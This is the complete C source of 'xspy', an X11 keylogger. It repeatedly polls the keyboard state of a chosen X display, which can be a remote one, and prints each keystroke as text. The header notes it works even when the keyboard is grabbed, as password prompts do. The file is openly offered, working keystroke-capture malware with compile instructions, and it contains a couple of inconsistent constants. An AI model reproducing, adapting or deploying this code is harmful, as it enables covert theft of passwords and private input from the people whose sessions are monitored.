// to compile run "gcc -o xspy -lX11 xspy.c"
/*
   xspy
   Jon A. Maxwell (JAM)
   jmaxwell@acm.vt.edu
   Monitors keystrokes even the keyboard is grabbed.
*/


/*
   xspy polls the keyboard to determine the state of all keys on
   the keyboard.  By comparing results it determines which key has
   been pressed and what modifiers are in use.  In this way it
   echos to the user all keystrokes typed.

   xspy is freely distributable, provided the source remains intact.
*/

#include <X11/Xlib.h>
#include <X11/X.h>

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define VERSION "1.0c"
#define DEFAULT_DISPLAY ":0"
#define DEFAULT_DELAY   10000
#define BIT(c, x)   ( c[x/8]&(1<<(x%8)) )
#define TRUE    1
#define FALSE   0

#define KEYSYM_STRLEN   64

#define SHIFT_DOWN  1
#define LOCK_DOWN   5
#define CONTROL_DOWN    3
#define ISO3_DOWN    4
#define MODE_DOWN    5

/* I think it is pretty standard */
#define SHIFT_INDEX 1  /*index for XKeycodeToKeySym(), for shifted keys*/
#define MODE_INDEX 2
#define MODESHIFT_INDEX 3
#define ISO3_INDEX 4 //TODO geht leider nicht??
#define ISO3SHIFT_INDEX 4

/* Global variables */
extern Display *disp;
extern int PrintUp;

Display *disp;
int PrintUp  =FALSE;

char *KeyCodeToStr(int code, int down, int mod);

int usage() {
   printf("%s\n%s\n%s\n%s\n%s%s%s\n",
          "USAGE: xspy -display <display> -delay <usecs> -up",
          "       Options: display, specifies an X display.",
          "           delay, determines the polling frequency (.1 sec is 100000 usecs)",
          "           up, gives up transitions for some keys.",
          "       Version ",VERSION, ", by JAM");
   exit(0);
}



int main(int argc, char *argv[]) {
   char    *hostname=DEFAULT_DISPLAY,
           *char_ptr,
           buf1[32],   buf2[32],
           *keys,
           *saved;
   int i,  delay=DEFAULT_DELAY;

   /* get args */
   for (i=1; i<argc; i++) {
      if (!strcmp(argv[i], "-help")) usage();
      else if (!strcmp(argv[i], "-display")) {
         i++;
         hostname=argv[i];
      }
      else if (!strcmp(argv[i], "-delay")) {
         i++;
         delay=atoi(argv[i]);
      }
      else if (!strcmp(argv[i], "-up"))   {PrintUp  =TRUE;}
      else usage();
   }

   /* setup Xwindows */
   disp=XOpenDisplay(hostname);
   if (NULL==disp) {
      fprintf(stderr, "Cannot open X display: %s\n", hostname);
      exit(1);
   }
   XSynchronize(disp, TRUE);

   /* setup buffers */
   saved=buf1; keys=buf2;
   XQueryKeymap(disp, saved);

   while (1) {
      /* find changed keys */
      XQueryKeymap(disp, keys);
      for (i=0; i<32*8; i++) {
         if (BIT(keys, i)!=BIT(saved, i)) {
            register char *str;
            str=(char *)KeyCodeToStr(i, BIT(keys, i), KeyModifiers(keys));
            if (BIT(keys, i)!=0 || PrintUp) printf("%s\n",str);
            fflush(stdout); /* in case user is writing to a pipe */
         }
      }

      /* swap buffers */
      char_ptr=saved;
      saved=keys;
      keys=char_ptr;

      usleep(delay);
   }
}


/* This part takes the keycode and makes an output string. */

/*
   Have a keycode, Look up keysym for it.
   Convert keysym into its string representation.
   if string is more than one character try to reduce it to one.
   if string still is more than one character, put it into the form
   (+string) or (-string) depending on whether the key is up or down.
   print out the string.
*/

struct conv {char from[20], to[5];} conv_table[] = {
   /* shift & control replaced with nothing, since they are appearent
      from the output */
   {"return",""},    {"escape","^["},    {"delete", "^H"},
   {"shift",""},       {"control",""},     {"tab","\t"},
   {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""}, 
   {"numbersign", "#"},{"dollar", "$"},    {"percent", "%"},
   {"ampersand", "&"}, {"apostrophe", "'"},{"parenleft", "("}, 
   {"parenright", ")"},{"asterisk", "*"},  {"plus", "+"},
   {"comma", ","},     {"minus", "-"},     {"period", "."},    
   {"slash", "/"},     {"colon", ":"},     {"semicolon", ";"}, 
   {"less", "<"},      {"equal", "="},     {"greater", ">"},   
   {"question", "?"},  {"at", "@"},        {"bracketleft", "["},
   {"backslash", "\\"},{"bracketright", "]"},{"asciicircum", "^"},   
   {"underscore", "_"},{"grave", "`"},     {"braceleft", "{"}, 
   {"bar", "|"},       {"braceright", "}"},{"asciitilde", "~"},    
   {"odiaeresis","ö"},{"udiaeresis","ü"},{"adiaeresis","ä"},{"",""}
};

int StrToChar(char *data) {
   int i=0;
   while (conv_table[i].from[0]!=0 || conv_table[i].to[0]!=0) {
      if (!strncasecmp(data,conv_table[i].from,
                       strlen(conv_table[i].from)) ) {
         strcpy(data,  conv_table[i].to);
         return TRUE;
      }
      i++;
   }
   return FALSE;
}

char *KeyCodeToStr(int code, int down, int mod) {
   static char *str, buf[KEYSYM_STRLEN+1];
   int index;
   KeySym  keysym;
   /* get the keysym for the appropriate case */
	switch (mod) {
		case SHIFT_DOWN:
			index=SHIFT_INDEX;
			break;
		case ISO3_DOWN:
			index=ISO3_INDEX;
			break;
		case MODE_DOWN:
			index=MODE_INDEX;
			break;
		default:
			index=0;
	}


   keysym=XKeycodeToKeysym(disp, code, index);
   if (NoSymbol==keysym) return "";

   /* convert keysym to a string, copy it to a local area */
   str=XKeysymToString(keysym);

   if (strcmp(str,"ISO_Level3_Shift") == 0) {
		keysym=XKeycodeToKeysym(disp, code, ISO3_INDEX);
		str=XKeysymToString(keysym);
   }

   if (NULL==str) return "";
   strncpy(buf, str, KEYSYM_STRLEN); buf[KEYSYM_STRLEN]=0;

   /* try to reduce strings to character equivalents */
   if (buf[1]!=0 && !StrToChar(buf)) {
	if (strcmp(buf, "Caps_Lock") == 0) return "";
      /* still a string, so put it in form (+str) or (-str) */
      if (down) strcpy(buf, "(+");
      else      strcpy(buf, "(-");
      strcat(buf, str);
      strcat(buf, ")");
      return buf;
   }
   if (buf[0]==0) return "";
   if (mod==CONTROL_DOWN) {
      buf[2]=0;
      buf[1]=toupper(buf[0]);
      buf[0]='^';
   }
   if (mod==LOCK_DOWN) {buf[0]=toupper(buf[0]);}
   return buf;
}


/* returns which modifier is down, shift/caps or control */
int KeyModifiers(char *keys) {
   static int setup=TRUE;
   static int width;
   static XModifierKeymap *mmap;
   int i;

   if (setup) {
      setup=FALSE;
      mmap=XGetModifierMapping(disp);
      width=mmap->max_keypermod;
   }
   for (i=0; i<width; i++) {
      KeyCode code;

      code=mmap->modifiermap[ControlMapIndex*width+i];
      if (code && 0!=BIT(keys, code)) {return CONTROL_DOWN;}

      code=mmap->modifiermap[ShiftMapIndex*width  +i];
      if (code && 0!=BIT(keys, code)) {return SHIFT_DOWN;}

      code=mmap->modifiermap[LockMapIndex*width   +i];
      if (code && 0!=BIT(keys, code)) {return LOCK_DOWN;}
      
			code=mmap->modifiermap[Mod3MapIndex*width   +i];
      if (code && 0!=BIT(keys, code)) {return ISO3_DOWN;}
      
			code=mmap->modifiermap[Mod5MapIndex*width   +i];
      if (code && 0!=BIT(keys, code)) {return MODE_DOWN;}
   }
   return 0;
}


/* if usleep is missing

include <sys/types.h>
include <sys/time.h>

void usleep(x) {
   struct timeval  time;

   time.tv_sec= x/1000000;
   time.tv_usec=x%1000000;
   select(0, NULL, NULL, NULL, &time);
}

*/
